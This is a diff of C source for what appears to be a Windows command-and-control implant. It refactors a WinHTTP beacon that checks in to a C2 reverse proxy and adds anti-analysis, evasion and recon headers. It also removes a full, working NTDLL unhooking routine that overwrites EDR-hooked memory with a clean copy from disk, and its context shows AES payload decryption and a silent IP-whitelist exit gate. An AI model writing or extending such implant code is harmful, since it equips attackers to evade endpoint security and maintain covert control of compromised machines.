@@ -1,6 +1,9 @@
 #include "winhttp.h"
 #include "windows.h"
 #include "bcrypt.h"
+#include "anti_analysis.h"
+#include "evasion.h"
+#include "recon.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <intrin.h>
@@ -9,8 +12,6 @@
 #define KEYSIZE 32
 #define IVSIZE 16
 #define INITIAL_SEED 5
-#define NTDLL_NAME "NTDLL.DLL"
-#define MAP_NTDLL
 #define C_PTR(x) (PVOID) (x)
 #define U_PTR(x) (UINT_PTR)(x)
 //Precomputed hashes -run
@@ -107,65 +108,60 @@ pBUffer[i]=(BYTE)rand() %0xFF;
 }
 }
 // start checking call back to the reserve proxy
-BOOL checking_connection(BOOL* Connection)
-{
-    *Connection =FALSE;
-    //declairing  all handlers
-HINTERNET hSession = NULL,
-hConnect=NULL,
-hRequest=NULL;
-DWORD statusCode = 0;
-DWORD statusSize =sizeof(DWORD);
-BOOL theResponse=FALSE;
+BOOL checking_connection(BOOL *Connection) {
+  *Connection = FALSE;
 
-//create a session handle
-hSession =WinHttpOpen(L"WinHTTP Please_Just_Trust_This_Agent/1.0",
-WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-WINHTTP_NO_PROXY_NAME,
-WINHTTP_NO_PROXY_BYPASS,
-0);
-if(!hSession)
-{
-goto ending_Check;
-}
-//connect to the reverse Proxy
-hConnect = WinHttpConnect(hSession, L"www.the0dayworkshop.com", INTERNET_DEFAULT_HTTPS_PORT,0);
-if(!hConnect)
-{
-goto ending_Check;
-}
-//Creating the POST request
-hRequest = WinHttpOpenRequest(hConnect, L"GET",NULL,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
-if(!hRequest)
-{
-    goto ending_Check;
-}
-// putting it all on 17 black and let it ride
-theResponse =WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
-// read the response
-// if 200 set COnnection to TRUE
-if(!theResponse)
-{
-    goto ending_Check;
-}
-if(!WinHttpReceiveResponse(hRequest,NULL))
-{
-    goto ending_Check;
-}
+  HINTERNET hSession = NULL;
+  HINTERNET hConnect = NULL;
+  HINTERNET hRequest = NULL;
+  DWORD statusCode = 0;
+  DWORD statusSize = sizeof(DWORD);
 
-WinHttpQueryHeaders(
-    hRequest,
-    WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER,
-    WINHTTP_HEADER_NAME_BY_INDEX,
-    &statusCode,
-    &statusSize,
-    WINHTTP_NO_HEADER_INDEX
-);
- if (statusCode == 200)
- {
- *Connection =TRUE;
-}
+  // create session handle
+  hSession = WinHttpOpen(C2_USERAGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+  if (!hSession)
+    goto cleanup;
 
+  // connect to C2 reverse proxy
+  hConnect = WinHttpConnect(hSession, C2_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
+  if (!hConnect)
+    goto cleanup;
+
+  // create GET request
+  hRequest =
+      WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, WINHTTP_NO_REFERER,
+                         WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+  if (!hRequest)
+    goto cleanup;
+
+  // send it
+  if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0))
+    goto cleanup;
+
+  // read response
+  if (!WinHttpReceiveResponse(hRequest, NULL))
+    goto cleanup;
+
+  // check status code
+  WinHttpQueryHeaders(hRequest,
+                      WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                      WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
+                      WINHTTP_NO_HEADER_INDEX);
+
+  if (statusCode == 200)
+    *Connection = TRUE;
+
+cleanup:
+  if (hRequest)
+    WinHttpCloseHandle(hRequest);
+  if (hConnect)
+    WinHttpCloseHandle(hConnect);
+  if (hSession)
+    WinHttpCloseHandle(hSession);
+  return *Connection;
+}
 
 //else set connection to false
 //close all connections 
@@ -386,6 +382,10 @@ _EndOfFunc:
   }
   return bSTATE;
 }
+VOID comms_wipe_keys(VOID) {
+  SecureZeroMemory(aes_key, KEYSIZE);
+  SecureZeroMemory(aes_iv, IVSIZE);
+}
 
 BOOL InstallAesDecryption (PEAS pAes)
 {
@@ -561,192 +561,6 @@ BOOL aes_decrypt_payload(
     return TRUE;
 }
 
-
-//NTDLL
-/*
-1. Open a fresh copy of ntdll.dll from disk
-2. Map it into memory
-3. Compare .text section to loaded (hooked) NTDLL
-4. Overwrite hooked bytes with clean bytes
-5. Call this ONCE before your beacon loop starts
-*/
-
-// ── Step 1: Map a clean copy of ntdll.dll from disk ─────────────
-BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {
-    HANDLE hFile = NULL;
-    HANDLE hSection = NULL;
-    CHAR cWinPath[MAX_PATH / 2] = {0};
-    CHAR cNtdllPath[MAX_PATH] = {0};
-    PBYTE pNtdllBuffer = NULL;
-
-    // get Windows directory (e.g. C:\Windows)
-    if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
-      printf("[!] GetWindowsDirectoryA Failed With Error : %d \n",
-             GetLastError());
-      goto _EndOfFunc;
-    }
-
-    // build full path: C:\Windows\System32\NTDLL.DLL
-    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath,
-              NTDLL_NAME);
-    printf("[*] Loading clean NTDLL from: %s\n", cNtdllPath);
-
-    // open the file
-    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
-                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-      printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
-      goto _EndOfFunc;
-    }
-
-    // create a read-only section mapping
-    // SEC_IMAGE_NO_EXECUTE handles PE alignment automatically
-    hSection = CreateFileMappingA(
-        hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
-    if (hSection == NULL) {
-      printf("[!] CreateFileMappingA Failed With Error : %d \n",
-             GetLastError());
-      goto _EndOfFunc;
-    }
-
-    // map the view into our process
-    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
-    if (pNtdllBuffer == NULL) {
-      printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
-      goto _EndOfFunc;
-    }
-
-    printf("[+] Clean NTDLL mapped at: 0x%p\n", pNtdllBuffer);
-    *ppNtdllBuf = pNtdllBuffer;
-
-  _EndOfFunc:
-    if (hFile)
-      CloseHandle(hFile);
-    if (hSection)
-      CloseHandle(hSection);
-    if (*ppNtdllBuf == NULL)
-      return FALSE;
-    return TRUE;
-}
-
-// ── Step 2: Get base address of the loaded (hooked) ntdll ────────
-// ntdll is always the 2nd entry in InMemoryOrderModuleList
-// (1st is the current process image)
-PVOID FetchLocalNtdllBaseAddress() {
-#ifdef _WIN64
-    PPEB pPeb = (PPEB)__readgsqword(0x60);
-#else
-    PPEB pPeb = (PPEB)__readfsdword(0x30);
-#endif
-    PLDR_DATA_TABLE_ENTRY pLdr =
-        (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink
-                                    ->Flink -
-                                0x10);
-
-    printf("[*] Loaded (hooked) NTDLL base: 0x%p\n", pLdr->DllBase);
-    return pLdr->DllBase;
-}
-
-// ── Step 3: Overwrite hooked .text with clean .text ──────────────
-BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
-    PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
-
-    // validate DOS header
-    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
-    if (!pLocalDosHdr || pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
-      printf("[!] Invalid DOS signature on loaded NTDLL\n");
-      return FALSE;
-    }
-
-    // validate NT headers
-    PIMAGE_NT_HEADERS pLocalNtHdrs =
-        (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
-    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
-      printf("[!] Invalid NT signature on loaded NTDLL\n");
-      return FALSE;
-    }
-
-    PVOID pLocalNtdllTxt = NULL;  // hooked .text in memory
-    PVOID pRemoteNtdllTxt = NULL; // clean .text from disk
-    SIZE_T sNtdllTxtSize = 0;
-
-    // find the .text section by name
-    // (*(ULONG*)name | 0x20202020) == 'xet.' is a case-insensitive
-    // little-endian compare for ".tex" — standard Maldev pattern
-    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
-    for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
-      if ((*(ULONG *)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
-        pLocalNtdllTxt =
-            (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
-#ifdef MAP_NTDLL
-        // MAP: VirtualAddress is valid directly — SEC_IMAGE_NO_EXECUTE handles
-        // alignment
-        pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll +
-                                  pSectionHeader[i].VirtualAddress);
-#endif
-        sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
-        printf("[*] .text section found — VA: 0x%p | Size: %zu bytes\n",
-               pLocalNtdllTxt, sNtdllTxtSize);
-        break;
-      }
-    }
-
-    // verify we found everything
-    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
-      printf("[!] Failed to locate .text section\n");
-      return FALSE;
-    }
-
-    // make .text writable (PAGE_EXECUTE_WRITECOPY avoids CoW faults)
-    DWORD dwOldProtection = 0;
-    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY,
-                        &dwOldProtection)) {
-      printf("[!] VirtualProtect [1] Failed With Error : %d \n",
-             GetLastError());
-      return FALSE;
-    }
-
-    // overwrite hooked bytes with clean bytes
-    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
-    printf("[+] .text section overwritten with clean copy\n");
-
-    // restore original memory protection
-    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection,
-                        &dwOldProtection)) {
-      printf("[!] VirtualProtect [2] Failed With Error : %d \n",
-             GetLastError());
-      return FALSE;
-    }
-
-    return TRUE;
-}
-
-// ── Wrapper: call this ONCE at top of beacon_run() ───────────────
-BOOL unhook_ntdll() {
-    PVOID pCleanNtdll = NULL;
-
-    printf("[*] Starting NTDLL unhook...\n");
-
-    // map clean copy from disk
-    if (!MapNtdllFromDisk(&pCleanNtdll)) {
-      printf("[!] MapNtdllFromDisk Failed\n");
-      return FALSE;
-    }
-
-    // overwrite hooked .text with clean .text
-    if (!ReplaceNtdllTxtSection(pCleanNtdll)) {
-      printf("[!] ReplaceNtdllTxtSection Failed\n");
-      UnmapViewOfFile(pCleanNtdll);
-      return FALSE;
-    }
-
-    // unmap the clean copy — no longer needed
-    UnmapViewOfFile(pCleanNtdll);
-
-    printf("[+] NTDLL unhooked successfully\n");
-    return TRUE;
-}
-
 //IP WhiteList Gate
 /*
 1. Call GetAdaptersInfo() → enumerate NICs
@@ -754,7 +568,7 @@ BOOL unhook_ntdll() {
 3. If not in range → ExitProcess(0) silently
 4. If in range → continue to beacon loop
 */
-static ULONG GetCurrentIpAddress(){
+ ULONG GetCurrentIpAddress(){
     INTERFACE_INFO Interfaces[10] = {0};
     WSADATA Data = {0};
     SOCKET Socket = {0};
